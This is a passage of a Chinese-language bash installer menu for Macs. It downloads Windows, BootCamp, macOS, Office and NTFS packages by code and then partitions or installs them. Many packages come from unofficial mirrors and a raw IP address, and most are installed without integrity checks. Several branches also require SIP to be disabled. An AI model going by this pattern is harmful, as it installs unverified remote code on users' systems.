	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
	tarbc=""
	DrvWZ="1"
	WZname="5"$wzhfxt".dmg"
	name="5"$wzhfxt".dmg"
	url="http://ty.mac55.com/server7254/5"$wzhfxt".dmg"
	if [ "$wzhfxt" = "7242" ]; then
	url="http://ty.mac55.com/server1907/5"$wzhfxt".dmg"
	fi
	FenQu2
	fi
	
	if [ "${CustomizeURL}" = "4033" ]
	then
	if [ "$pcissd" ]; then
	echo
	echo
	echo
	echo "注意：检测到PCI转接硬盘！"
	echo
	echo
	read -s -n1 -p "PCI转接硬盘，无法安装Win7！！！"
    Customize
	fi
	if [ "$NoWin7" ]; then
	echo
    read -s -n1 -p "此机型不支持安装Win7！"
    Customize	
	fi
	if [ "$sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
    read -s -n1 -p "SIP未关闭，无法安装！！！"
    Customize
	fi
	tarbc=""
	DrvWZ="1"
	MBR10="1"
	wzhfxt77="1"
	WZname="7"$wzhfxt7".dmg"
	name="7"$wzhfxt7".dmg"
	url="http://ty.mac55.com/server7254/7"$wzhfxt7".dmg"
	FenQu2
	fi
													
	if [ "${CustomizeURL}" = "sip" ]
	then
	#HFSIP="1"
	#AZPKG
	name="Recovery.dmg"
	url="$ip8/Os/hf10.11.dmg"
	Download
	fi
	
	if [ "${CustomizeURL}" = "bc" ]
	then
	DowBootCampDow
	fi
		
	if [ "${CustomizeURL}" = "yp" ]
	then
	name="yp.zip"
	url="$ip5/yp.zip"
	Download
	fi
	
	if [ "${CustomizeURL}" = "zdsip" ]
	then
	HFSIP="1"
	AZPKG
	fi
		
	if [ "${CustomizeURL}" = "sj" ]
	then
	SJZGMAC
	fi	
	
	if [ "${CustomizeURL}" = "u"${CustomizeURL:1:1}${CustomizeURL:2:1}"pe" ]
	then
	azuppe="1"
    CustomizeURL=""${CustomizeURL:1:1}${CustomizeURL:2:1}"pe"
	fi
	
	if [ "${CustomizeURL}" = "b"${CustomizeURL:1:1}${CustomizeURL:2:1}"pe" ]
	then
	azbdpe="1"
    CustomizeURL=""${CustomizeURL:1:1}${CustomizeURL:2:1}"pe"
	fi
			
	if [ "${CustomizeURL}" = "10pe" ]
	then
	name="10pe.iso"
	url="$ip8/666/10PE.iso"
	if [ "$azbdpe" ]; then
	AZPKG
	fi
	Download
	fi

	if [ "${CustomizeURL}" = "21pe" ]
	then
	name="21PE.iso"
	url="$ip8/666/21PE.iso"
	if [ "$azbdpe" ]; then
	AZPKG
	fi
	Download
	fi

	if [ "${CustomizeURL}" = "apfs" ]
	then
	name="apfs.zip"
	url="$ip/Os/OfficialAPFSFWUpdate.zip"
	Download
	fi
	
	if [ "${CustomizeURL}" = "732" ]
	then
	if [ "$sip" ]; then
	clear && printf "\e[3J"
	echo	
	echo
	echo
    read -s -n1 -p "SIP未关闭，无法安装！！！"
    Customize
	fi
	DrvWin7="1"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp4.0.4033.zip"
	name2="7x32.dmg"
	xtname3="7x32.dmg"
	url2="$ip8/666/7x32.img.gz"
	FenQu2
	fi
	
	if [ "${CustomizeURL}" = "m777" ]; then
	mjh7="1"
	CustomizeURL="777"
    fi
    
	if [ "${CustomizeURL}" = "777" ]
	then
	if [[ $modelxh = "10.6"* ]]; then
	MAC106="1"
 	name="BootCamp4.0.4033.zip"
	url="http://s1.mac2x.com/bootcamp/4.x/BootCamp4.0.4033.zip"
	else
	if [ "$btap" ]; then
 	name="BootCamp$btap.zip"
	url="$ip8/BootCamp/BootCamp$btap.zip"
	else
 	name="BootCamp4.0.4033.zip"
	url="$ip8/BootCamp/BootCamp4.0.4033.zip"
    fi
	fi
	name2="winclone7.dmg"
	url2="http://wxdnzy.top/Winclone7/Winclone7.dmg"
	FenQu2
	fi

	if [ "${CustomizeURL}" = "m7766" ]; then
	mjh7="1"
	CustomizeURL="7766"
    fi
	
	if [ "${CustomizeURL}" = "7766" ]
	then
	if [[ $modelxh = "10.6"* ]]; then
	MAC106="1"
 	name="BootCamp4.0.4033.zip"
	url="http://s1.mac2x.com/bootcamp/4.x/BootCamp4.0.4033.zip"
	else
	if [ "$btap" ]; then
 	name="BootCamp$btap.zip"
	url="$ip3/BootCamp/BootCamp$btap.zip"
	else
 	name="BootCamp4.0.4033.zip"
	url="$ip3/BootCamp/BootCamp4.0.4033.zip"
    fi
	fi
	name2="winclone7.dmg"
	url2="http://dl.xcc.red/onedrive_cn/winclone/WIN764.winclone.zip"
	FenQu2
	fi


	if [ "${CustomizeURL}" = "764" ]
	then
	if [ "$btap" ]; then
 	name="BootCamp$btap.zip"
	url="$ip8/BootCamp/BootCamp$btap.zip"
	else
 	name="BootCamp4.0.4033.zip"
	url="$ip8/BootCamp/BootCamp4.0.4033.zip"
    fi
	name2="cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	url2="http://ybcn-ruanjiandown-com.supergslb.com/cn/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	FenQu2
	fi
	
	if [ "${CustomizeURL}" = "251100" ]; then
	soft="1"
	CustomizeURL="1100"
	fi
	
	if [ "${CustomizeURL}" = "1100" ]
	then
	if [[ $modelxh = "10.9"* ]]; then
	old="1"
	fi
	if [[ $modelxh = "10.8"* ]]; then
	old="1"
	fi
	if [[ $modelxh = "10.7"* ]]; then
	old="1"
	fi
	if [ "$old" ]; then
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	fi
	name2="winclone10.dmg"
	url2="http://119.188.240.184/wr/winclone10pro.zip"
	FenQu2	
	fi
	if [ "$w10btap" ]; then
 	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp$w10btap.zip"
	name2="1809.esd"
	url2="$ip8/666/1809.esd"
	FenQu2
	fi
	name="1809.esd"
	url="$ip8/666/1809.esd"
	FenQu2	
	fi	
	
	if [ "${CustomizeURL}" = "cmm" ]
	then
	name="cmm.dmg"
	url="$ip8/666/CMM.dmg"
	Download
	fi
	
	if [ "${CustomizeURL}" = "u10.7" ]
	then
	upazmac="1"
    CustomizeURL="10.7"
	fi
			
	if [ "${CustomizeURL}" = "10.7" ]
	then
	name="10.7.5.dmg"
	url="$ip8/Os/10.7.5.dmg"
	Download
	fi
	
	if [ "${CustomizeURL}" = "b10."${CustomizeURL:4:1}${CustomizeURL:5:1}"" ]
	then
	azmac="1"
    CustomizeURL="10."${CustomizeURL:4:1}${CustomizeURL:5:1}""
	fi
	
	if [ "${CustomizeURL}" = "u10."${CustomizeURL:4:1}${CustomizeURL:5:1}"" ]
	then
	upazmac="1"
    CustomizeURL="10."${CustomizeURL:4:1}${CustomizeURL:5:1}""
	fi	
		
	if [ "${CustomizeURL}" = "10.10" ]
	then
	name="10.10.5.dmg"
	url="$ip/Os/10.10.5.dmg"
	if [ "$azmac" ] ;then
	if [ "$apfsfq" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "当前系统版本无法本地降级10.10，请制作U盘、本地PE"
    Customize
	fi
	AZPKG
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	Download
	fi
			
	if [ "${CustomizeURL}" = "10.11" ]
	then
	name="10.11.6.dmg"
	url="$ip/Os/10.11.6.dmg"
	if [ "$azmac" ] ;then
	if [ "$apfsfq" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "当前系统版本无法本地降级10.11，请制作U盘、本地PE"
    Customize
	fi
	AZPKG
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	Download
	fi
			
	if [ "${CustomizeURL}" = "10.12" ]
	then
	if [ "$apfsfq" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "当前系统版本无法本地降级10.12，请制作U盘、本地PE"
    Customize
	fi
	name="USB.Flash.Install.macOS.Sierra.10.12.6.dmg"
	url="$ip8/Os/10.12.6.dmg"
	if [ "$azmac" ] ;then
	AZPKG
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	Download
	fi
							
	if [ "${CustomizeURL}" = "10.13" ]
	then
	name="USB.Flash.Install.macOS.High.Sierra.10.13.6.02.v2n.dmg"
	url="$ip8/Os/10.13.6.dmg"
	if [ "$azmac" ] ;then
	AZPKG
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	Download
	fi
			
	if [ "${CustomizeURL}" = "10.14" ]
	then
	name="USB.Flash.Install.macOS.Mojave.10.14.6.06.v2s.dmg"
	url="$ip8/Os/10.14.6.dmg"
	if [ "$azmac" ] ;then
	AZPKG
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	Download
	fi
						
	if [ "${CustomizeURL}" = "10.15" ]
	then
	name="USB.Flash.Install.macOS.Catalina.10.15.7.02.19H2.dmg"
	url="$ip8/Os/10.15.7.dmg"
	if [ "$azmac" ] ;then
	AZPKG
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	Download
	fi
	
	if [ "${CustomizeURL}" = "b1"${CustomizeURL:2:1}".0" ]
	then
	azmac="1"
    CustomizeURL="1"${CustomizeURL:2:1}".0"
	fi
	
	if [ "${CustomizeURL}" = "u1"${CustomizeURL:2:1}".0" ]
	then
	upazmac="1"
    CustomizeURL="1"${CustomizeURL:2:1}".0"
	fi	
			
	if [ "${CustomizeURL}" = "11.0" ]
	then
	name="USB.Flash.Install.macOS.Big.Sur.v11.5.2.20G95.Y2.dmg"
	url="$ip8/Os/11x.dmg"
	if [ "$azmac" ] ;then
	AZPKG
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	Download
	fi
	
	if [ "${CustomizeURL}" = "12.0" ]
	then
	name="USB.Flash.Install.macOS.Monterey.v12.6.Y1.dmg"
	url="$ip8/Os/12x.dmg"
	if [ "$azmac" ] ;then
	AZPKG
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	Download
	fi
			
	if [ "${CustomizeURL}" = "sj10.10" ]
	then
	oldsj="1"
	name="InstallMacOSX.dmg"
	url="http://updates-http.cdn-apple.com/2019/cert/061-41343-20191023-02465f92-3ab5-4c92-bfe2-b725447a070d/InstallMacOSX.dmg"
	AZPKG
	fi
			
	if [ "${CustomizeURL}" = "sj10.11" ]
	then
	oldsj="1"
	name="InstallMacOSX.dmg"
	url="http://updates-http.cdn-apple.com/2019/cert/061-41424-20191024-218af9ec-cf50-4516-9011-228c78eda3d2/InstallMacOSX.dmg"
	AZPKG
	fi
			
	if [ "${CustomizeURL}" = "sj10.12" ]
	then
	oldsj="1"
	name="InstallOS.dmg"
	url="http://updates-http.cdn-apple.com/2019/cert/061-39476-20191023-48f365f4-0015-4c41-9f44-39d3d2aca067/InstallOS.dmg"
	AZPKG
	fi		
		
	if [ "${CustomizeURL}" = "sj10.13" ]
	then
	appsj="1"
	name="app10.13.zip"
	url="$ip5/app10.13.zip"
	Download
	fi	
		
	if [ "${CustomizeURL}" = "sj10.14" ]
	then
	appsj="1"
	name="app10.14.zip"
	url="$ip5/app10.14.zip"
	Download
	fi	
		
	if [ "${CustomizeURL}" = "sj10.15" ]
	then
	appsj="1"
	name="app10.15.zip"
	url="$ip5/app10.15.zip"
	Download
	fi	
		
	if [ "${CustomizeURL}" = "sj11.0" ]
	then
	appsj="1"
	name="app11.0.zip"
	url="$ip5/app11.0.zip"
	Download
	fi	
		
	if [ "${CustomizeURL}" = "sj12.0" ]
	then
	appsj="1"
	name="app12.0.zip"
	url="$ip5/app12.0.zip"
	Download
	fi	

	if [ "${CustomizeURL}" = "sj13.0" ]
	then
	appsj="1"
	name="app13.0.zip"
	url="$ip5/app13.0.zip"
	Download
	fi
				
	if [ "${CustomizeURL}" = "2016" ]
	then
	azof="1"
	if [[ $modelxh = "10.10"* ]]; then
	name="2016.pkg"
	#url="https://officecdn-microsoft-com.akamaized.net/pr/C1297A47-86C4-4C1F-97FA-950631F94777/MacAutoupdate/Microsoft_Office_16.16.20101200_Installer.pkg"
	url="$ip/Os/2016.pkg"
    AZPKG
	fi
	if [[ $modelxh = "10.11"* ]]; then
	name="2016.pkg"
	#url="https://officecdn-microsoft-com.akamaized.net/pr/C1297A47-86C4-4C1F-97FA-950631F94777/MacAutoupdate/Microsoft_Office_16.16.20101200_Installer.pkg"
	url="$ip/Os/2016.pkg"
    AZPKG
	fi
	if [[ $modelxh = "10.12"* ]]; then
	name="2016.pkg"
	#url="https://officecdn-microsoft-com.akamaized.net/pr/C1297A47-86C4-4C1F-97FA-950631F94777/MacAutoupdate/Microsoft_Office_16.16.20101200_Installer.pkg"
	url="$ip/Os/2016.pkg"
    AZPKG
	fi
	name="2021.pkg"
	#url="https://officecdnmac.microsoft.com/pr/C1297A47-86C4-4C1F-97FA-950631F94777/MacAutoupdate/Microsoft_Office_16.63.22070801_BusinessPro_Installer.pkg"
	#url="https://officecdnmac.microsoft.com/pr/C1297A47-86C4-4C1F-97FA-950631F94777/MacAutoupdate/Microsoft_365_and_Office_16.72.23040900_BusinessPro_Installer.pkg"
	url="$ip/Os/2021.pkg"
    AZPKG
	fi
					
	if [ "${CustomizeURL}" = "ntfs" ]
	then
	if [ "$NTFS" ]; then
	name="tuxerantfs_2021_wm.dmg"
	url="https://cpv2.mairuan.com/ntfsformac.cc/trial/tuxerantfs_2021_wm.dmg"
	fi
    if [ "$NTFS2" ]; then
	name2="ntfsmac15_trial.dmg"
	url2="https://dl.paragon-software.com/demo/ntfsmac15_trial.dmg"
	fi
    Download
	fi
	
	if [ "${CustomizeURL}" = "mre700" ]; then
	mjh7="1"
	CustomizeURL="re700"
    fi
 	if [ "${CustomizeURL}" = "mre732" ]; then
	mjh7="1"
	CustomizeURL="re732"
    fi
       
	if [ "${CustomizeURL}" = "re732" ]
	then
	if [ "$NoWin7" ]; then
	echo
    read -s -n1 -p "此机型不支持安装Win7！"
    Customize	
	fi
	if [ "$No732" ]; then
	echo
    read -s -n1 -p "此机型不支持安装32位Win7"
    Customize	
	fi
	if [ "$sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
    read -s -n1 -p "SIP未关闭，无法安装！！！"
    Customize
	fi
	MAC106="1"
	PEDrv="1"
	repe="1"
	re700="1"
	Win786="1"
	index="5"
	if [ "$btap" ]; then
 	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp$btap.zip"
	else
 	name="BootCamp.zip"
	url="http://s1.mac2x.com/bootcamp/4.x/BootCamp4.0.4033.zip"
    fi
	name2="cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso"
	url2="http://ybcn.ruanjiandown.com:6875/cn/cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso"
	FenQu2
	fi
	
	if [ "${CustomizeURL}" = "re700" ]
	then
	if [ "$pcissd" ]; then
	echo
	echo
	echo
	echo "注意：检测到PCI转接硬盘！"
	echo
	echo
	read -s -n1 -p "PCI转接硬盘，无法安装Win7！！！"
    Customize
	fi
	if [ "$NoWin7" ]; then
	echo
    read -s -n1 -p "此机型不支持安装Win7！"
    Customize	
	fi
	if [ "$sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
    read -s -n1 -p "SIP未关闭，无法安装！！！"
    Customize
	fi
	MAC106="1"
	PEDrv="1"
	repe="1"
	MBR10="1"
	re700="1"
	index="4"
	OsWin764="1"
	if [ "$btap" ]; then
	if [ "$btap" = "5.1.5640" ]; then
 	name="BootCamp.zip"
	url="http://xzd.197946.com/bootcamp.zip"
	#url="http://s1.mac2x.com/bootcamp/5.x/BootCamp5.1.5640.zip"
	fi
	if [ "$btap" = "5.1.5621" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.1.4586" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/35/46/041-87995-A_EWCD1K4CH1/2b5jaj1p2oxqlpzgwat4bdqjpjs8n3mxip/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4326" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/50/29/041-84869-A_EJ35WAWA75/obofx71e3kcf8aqzukdrzg7hqpv1p06hca/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4255" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/36/49/041-98163/n3zau0xy5j0a121vnvud3jac2ahplizknu/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4131" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/29/62/041-84859-A_GGUOSJMIGN/sb1apxcjpp358ze2df6bzhwd49m2cqyzy5/BootCampESD.pkg"
	fi
	#name="BootCamp.zip"
	#url="$ip8/BootCamp/BootCamp$btap.zip"
	else
 	#name="BootCamp.zip"
	#url="http://s1.mac2x.com/bootcamp/4.x/BootCamp4.0.4033.zip"
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/57/55/041-84868-A_402D0DFI39/6uz8hhgtd4b87t00mrq0uihiop5ivumsbk/BootCampESD.pkg"	
    fi
	name2="cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	url2="http://ybcn-ruanjiandown-com.supergslb.com/cn/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	SourceSHA1="2ce0b2db34d76ed3f697ce148cb7594432405e23"
	drvname="cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	FenQu2
	fi
	
	if [ "${CustomizeURL}" = "ms700" ]; then
	mjh7="1"
	CustomizeURL="s700"
    fi	 
    	
	if [ "${CustomizeURL}" = "s700" ]
	then
	if [ "$pcissd" ]; then
	echo
	echo
	echo
	echo "注意：检测到PCI转接硬盘！"
	echo
	echo
	read -s -n1 -p "PCI转接硬盘，无法安装Win7！！！"
    Customize
	fi
	if [ "$NoWin7" ]; then
	echo
    read -s -n1 -p "此机型不支持安装Win7！"
    Customize	
	fi	
	MAC106="1"
	PEDrv="1"
	repe="1"
	MBR10=""
	re700="1"
	index="4"
	OsWin764="1"
	if [ "$btap" ]; then
	if [ "$btap" = "5.1.5640" ]; then
 	name="BootCamp.zip"
	url="http://xzd.197946.com/bootcamp.zip"
	#url="http://s1.mac2x.com/bootcamp/5.x/BootCamp5.1.5640.zip"
	fi
	if [ "$btap" = "5.1.5621" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.1.4586" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/35/46/041-87995-A_EWCD1K4CH1/2b5jaj1p2oxqlpzgwat4bdqjpjs8n3mxip/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4326" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/50/29/041-84869-A_EJ35WAWA75/obofx71e3kcf8aqzukdrzg7hqpv1p06hca/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4255" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/36/49/041-98163/n3zau0xy5j0a121vnvud3jac2ahplizknu/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4131" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/29/62/041-84859-A_GGUOSJMIGN/sb1apxcjpp358ze2df6bzhwd49m2cqyzy5/BootCampESD.pkg"
	fi
	else
 	#name="BootCamp.zip"
	#url="http://s1.mac2x.com/bootcamp/4.x/BootCamp4.0.4033.zip"
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/57/55/041-84868-A_402D0DFI39/6uz8hhgtd4b87t00mrq0uihiop5ivumsbk/BootCampESD.pkg"	
    fi
	name2="cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	url2="http://ybcn-ruanjiandown-com.supergslb.com/cn/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	SourceSHA1="2ce0b2db34d76ed3f697ce148cb7594432405e23"
	drvname="cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"	
	FenQu2
	fi
		
	if [ "${CustomizeURL}" = "re800" ]
	then
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
    if [ ! "$MBR10" ]; then
    if [[ $modelxh = "10.10"* ]]; then
    if [ "$EFI8" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.11"* ]]; then
    if [ "$EFI8" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.12"* ]]; then
    sip="1"
    fi
    fi
	PEDrv="1"
	repe="1"
	re800="1"
	index="1"
	drvname="cn_windows_8.1_with_update_x64_dvd_6051473.iso"
	name="cn_windows_8.1_with_update_x64_dvd_6051473.iso"
	url="http://ybcn-ruanjiandown-com.supergslb.com/cn/cn_windows_8.1_with_update_x64_dvd_6051473.iso"
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	fi
	FenQu2
	fi	
	
    if [ "${CustomizeURL}" = "s1709" ]
	then
	if [ ! "$sip" ]; then
	clear && printf "\e[3J"
	echo
	echo
	echo
	read -s -n1 -p "此机型SIP已关闭，使用正常RE模式"
    Customize
    fi
    if [ ! "$MBR10" ]; then
 	clear && printf "\e[3J"
	echo
	echo
	echo
	read -s -n1 -p "此机型请使用正常RE模式"
    Customize   
    fi    
    sip="1"
    sipp="1"
	PEDrv="1"
	pnputil="pnputil1709.exe"
	repe="1"
	index="6"
	drvname="1709.esd"
	name="1709.esd"
	SourceSHA1="d6bf989c6b57c7246fa72fec1e564808c3ee3255"
	url="http://wsus.ds.b1.download.windowsupdate.com/c/upgr/2017/10/16299.15.170928-1534.rs3_release_clientbusiness_vol_x64fre_zh-cn_d6bf989c6b57c7246fa72fec1e564808c3ee3255.esd"
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	MBR10=""
	FenQu2
	fi
	
    if [ "${CustomizeURL}" = "s10" ]
	then
	if [ ! "$sip" ]; then
	clear && printf "\e[3J"
	echo
	echo
	echo
	read -s -n1 -p "此机型SIP已关闭，使用正常RE模式"
    Customize
    fi
    if [ ! "$MBR10" ]; then
 	clear && printf "\e[3J"
	echo
	echo
	echo
	read -s -n1 -p "此机型请使用正常RE模式"
    Customize   
    fi    
    sip="1"
    sipp="1"
	PEDrv="1"
	repe="1"
	index="6"
	drvname="1809.esd"
	name="1809.esd"
	SourceSHA1="a37dc7f616f37aa1f7a775b68144ad474086e190"
	url="http://fg.ds.b1.download.windowsupdate.com/c/Upgr/2018/09/17763.1.180914-1434.rs5_release_clientbusiness_vol_x64fre_zh-cn_a37dc7f616f37aa1f7a775b68144ad474086e190.esd"
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	MBR10=""
	FenQu2
	fi
	
    if [ "${CustomizeURL}" = "s1909" ]
	then
	if [ ! "$sip" ]; then
	clear && printf "\e[3J"
	echo
	echo
	echo
	read -s -n1 -p "此机型SIP已关闭，使用正常RE模式"
    Customize
    fi
    if [ ! "$MBR10" ]; then
 	clear && printf "\e[3J"
	echo
	echo
	echo
	read -s -n1 -p "此机型请使用正常RE模式"
    Customize   
    fi
    sip="1"
    sipp="1"
	PEDrv="1"
	repe="1"
	index="6"
	drvname="1909.esd"
	name="1909.esd"
	if [ "$sysyy" = "en" ]; then
	index="8"
	drvname="1909en.esd"
	name="1909en.esd"
	SourceSHA1="d8e61d0513c6bb255bcf3b0f6fb5231484f252d7"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/bbd730ba-c42b-4cb8-a7ab-9d7624149182/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_en-us.esd"
	fi
	if [ "$sysyy" = "tw" ]; then
	drvname="1909tw.esd"
	name="1909tw.esd"
	SourceSHA1="7548fb3b318939db4c8de20b73139229ed92bdc1"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/d3e6bf19-fda0-4bdd-b183-64d9e00597d9/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-tw.esd"
    fi
    if [ "$sysyy" = "ko" ]; then
    drvname="1909ko.esd"
	name="1909ko.esd"
    SourceSHA1="69999fe17b206900e5ae5139be97d93039348edb"
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/47e48fde-1d0e-4eb2-a224-8bed946ca644/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ko-kr.esd"
    fi
    if [ "$sysyy" = "jp" ]; then
    drvname="1909jp.esd"
	name="1909jp.esd"
    SourceSHA1="7e333df49c1bd0875cdeed3148fb84af752d72f1"
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/5bf0443e-bd94-49f7-9328-c1ba3bb590b1/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ja-jp.esd"
    fi
    if [ "$sysyy" = "" ]; then
    SourceSHA1="47102873fd333e715f06c840e08a149963cfb6a4"
	url="http://b1.download.windowsupdate.com/d/upgr/2020/11/18363.1139.201008-0514.19h2_release_svc_refresh_clientbusiness_vol_x64fre_zh-cn_47102873fd333e715f06c840e08a149963cfb6a4.esd"
	fi
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	MBR10=""
	FenQu2
	fi

    if [ "${CustomizeURL}" = "s2009" ]
	then
	if [ ! "$sip" ]; then
	clear && printf "\e[3J"
	echo
	echo
	echo
	read -s -n1 -p "此机型SIP已关闭，使用正常RE模式"
    Customize
    fi
    if [ ! "$MBR10" ]; then
 	clear && printf "\e[3J"
	echo
	echo
	echo
	read -s -n1 -p "此机型请使用正常RE模式"
    Customize   
    fi
    sip="1"
    sipp="1"
	PEDrv="1"
	repe="1"
	index="6"
	drvname="2009.esd"
	name="2009.esd"
	if [ "$sysyy" = "en" ]; then
	index="8"
	drvname="2009en.esd"
	name="2009en.esd"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/fc218496-6e48-47e9-9df1-d5719b3a59fa/19043.928.210409-1212.21h1_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_en-us.esd"
	fi
	if [ "$sysyy" = "tw" ]; then
	drvname="2009tw.esd"
	name="2009tw.esd"
